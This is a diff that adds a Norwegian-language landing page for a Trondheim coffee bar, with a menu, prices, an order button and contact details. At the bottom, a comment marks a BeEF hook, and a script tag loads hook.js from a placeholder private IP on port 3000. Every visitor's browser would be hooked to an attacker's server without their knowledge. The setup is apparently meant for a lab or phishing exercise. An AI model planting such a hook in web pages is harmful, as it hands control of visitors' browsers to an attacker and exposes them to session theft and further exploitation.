@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Velkommen til Kåres Kaffebar</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        .menu {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .menu-item {
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        .price {
+            float: right;
+            font-weight: bold;
+        }
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+        }
+        button:hover {
+            background: #ff5252;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>☕ Kåres Kaffebar ☕</h1>
+        <p>Velkommen til byens koseligste kaffebar! Her får du den beste kaffen i Trondheim.</p>
+        
+        <div class="menu">
+            <h2>Dagens Meny</h2>
+            <div class="menu-item">
+                Espresso <span class="price">35 kr</span>
+            </div>
+            <div class="menu-item">
+                Cappuccino <span class="price">45 kr</span>
+            </div>
+            <div class="menu-item">
+                Latte <span class="price">45 kr</span>
+            </div>
+            <div class="menu-item">
+                Americano <span class="price">40 kr</span>
+            </div>
+            <div class="menu-item">
+                Kanelbolle <span class="price">30 kr</span>
+            </div>
+        </div>
+        
+        <button onclick="alert('Takk for din bestilling! Vi kontakter deg snart.')">
+            Bestill nå!
+        </button>
+        
+        <p style="margin-top: 30px; text-align: center; font-size: 0.9em;">
+            📍 Adresse: Innherredsveien 42, Trondheim<br>
+            ⏰ Åpningstider: Man-Fre 07:00-18:00<br>
+            📞 Telefon: 73 12 34 56
+        </p>
+    </div>
+
+    <!-- BeeF Hook - BYTT UT IP-ADRESSEN! -->
+    <script src="http://192.168.111.XXX:3000/hook.js"></script>
+</body>
+</html>
